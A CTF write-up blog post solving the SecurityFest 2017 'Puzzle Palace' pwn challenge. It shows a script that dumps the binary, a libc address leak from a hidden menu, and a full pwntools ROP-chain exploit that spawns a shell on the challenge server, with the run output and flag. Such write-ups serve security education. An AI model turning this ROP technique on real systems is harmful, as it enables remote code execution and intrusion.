---
layout: post
title: "SecurityFest 2017 - Puzzle palace"
date:   2017-06-01 20:00
categories: CTF
tags: [SecurityFest2017]
categories: [pwn]
author: jbz
---

Pwn - 100 Points

_Adventure time! Find the magic bytes, kill the wizard, get all the flags!_

This was a very fun challenge, too bad it was only worth 100 points :). The organizer provided the libc and a README containing this: `Yep you only get the libc, connect to the service and go for an adventure to get the rest.`

You can find the provided archive [here](https://github.com/jbzteam/CTF/raw/master/SecurityFest2017/PuzzlePalace/puzzle_palace.tar.gz). The remote server was `pwn.ctf.rocks` port `6666`.

Great! Let's the fun start.

First of all we have to get the binary from the remote server. When we connect to it we find ourselves in front of this menu:
```
The Puzzle Palace
===============
1) Go on an adventure to find the magic bytes!
2) Fight the evil wizard with the magic bytes!
3) Return home with shame

#>
```
If we type `1` we get:
```
You enter the Puzzle Palace!
A message glows brightly on the wall of this room [7F454C4602010100000000000000000003003E0001000000100A000000000000400000000000000038210000000000000000000040003800090040001B001A00]
Where to now adventurer?
1) Up
2) Down

#>
```
We see `454C46`, which is the hex of `ELF`. That's probably the start of the binary. To get more of it we just have to type `2` in the prompt and it will continue playing bytes until EOF. I used this script to dump the whole thing:
```python
from pwn import *
s = remote("pwn.ctf.rocks", 6666)
s.sendlineafter("#>", "1")
with open("bin", "w") as f:
    while True:
        data = s.recvuntil("#>")
        data = data.split("[")[1].split("]")[0]
        print data
        data = data.strip()
        data = [data[i:i+2] for i in xrange(0,  len(data), 2)]
        for x in data:
            f.write(chr(int(x, 16)))
        s.sendline("2")
```
Yes, there is no check for EOF but the script crashes when it reached EOF so it's good enough :).

Let's see what the dumped binary is:
```
$ file challenge
challenge: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=7c3b19746df3ef56476d19ce0f657e14c0eb19cb, stripped
$ checksec challenge 
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
Nasty... well let's see how it works.

We know `1` of the initial menu, which is the leak of the binary, nothing much else there. `3` just quits the program. There's an hidden menu item if you press `Z`:
```c
if ( menu_entry == 'Z' )
  printf("Woah, nice! You found the hidden 'system' libc address:%p!\n", &system);
```
It leaks the address of `system`! Handy! Let's remember it for later.

Let's now focus on `2`.
```
Hope you got those magic bytes ready!
The wizard points at you and starts yelling 'lightning bolt!'
This would be a good time use those magic bytes: 
```
This is what we see when we press `2` in the main menu prompt. Let's see what it does after that:
```c
read_s2(256);
if ( strncmp("1337p0werOverWhelMing1337", s2, 25uLL) )
{
  puts("You utter the magic bytes but they are wrong and the evil wizard burns you to a crisp, GG!");
  exit(0);
}
printf("Nice! Pwn the wizard with some ROP and ROLL now!: ");
return read(0, &buf, 0x1337uLL);
```
So:
- `read_s2` just zeroes `s2` and writes 256 bytes read from stdin to it
- If `s2` is not `1337p0werOverWhelMing1337` the program exits
- It reads 0x1337 bytes of data (that is 4919 bytes) and saves it in `buf`, which is just a pointer on the stack. Ok, we can write stuff... a lot of it :)

If you remember, the binary has `NX` enabled, so no shellcode on the stack. It doesn't have a stack canary, which makes things easier in this case. So we just have to control RIP and create a ROP chain to execute our shell.

This is the final exploit:
```python
from pwn import *

s = remote("pwn.ctf.rocks", 6666)
#s = process("./bin")
libc = ELF("libc.so.6_eea5f41864be6e7b95da2f33f3dec47f")

s.sendlineafter("#>", "Z")
data = s.recvuntil("#>")

system_address = int(data.split(":")[1].split("!")[0], 16)
sh_address = system_address - 210208
libc_base = system_address - 283536
pop_rdi = libc_base + 0x21102

ropchain = ""
ropchain = "A" * 8 * 5
ropchain += p64(pop_rdi)
ropchain += p64(sh_address)
ropchain += p64(system_address)
log.info("system: {:x}".format(system_address))
log.info("libc: {:x}".format(libc_base))
log.info("sh: {:x}".format(sh_address))

s.sendline("2")
s.sendlineafter(":", "1337p0werOverWhelMing1337")
s.sendlineafter(":", ropchain)
s.interactive()
```
We create a simple ROP chain that `pop`s the address that points to `sh` in `rdi` and then we call `system`. Pretty straightforward.

- We first leak `system`'s address, and since the organizer provided libc we can easily calculate the address of `sh` and the location of a `pop rdi` gadget.
- We then prepare the payload that contains:
  - 40 bytes of padding to get to RIP (found via gdb)
  - the address of `pop rdi` that will overwrite RIP
  - the address of `sh` that will be put in `rdi`
  - the address of `system` that will run what's in `rdi`

Of course, we have to pass the string `1337p0werOverWhelMing1337` first. And we get our shell:
```bash
$ python exploit.py 
[+] Opening connection to pwn.ctf.rocks on port 6666: Done
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] system: 7febe305e390
[*] libc: 7febe3019000
[*] sh: 7febe302ae70
[*] Switching to interactive mode
$ id
uid=999(ctf) gid=999(ctf) groups=999(ctf)
$ cat flag
SCTF{1_4lwa4y5_h4t3d_w1zard5}
```

Happy hacking!



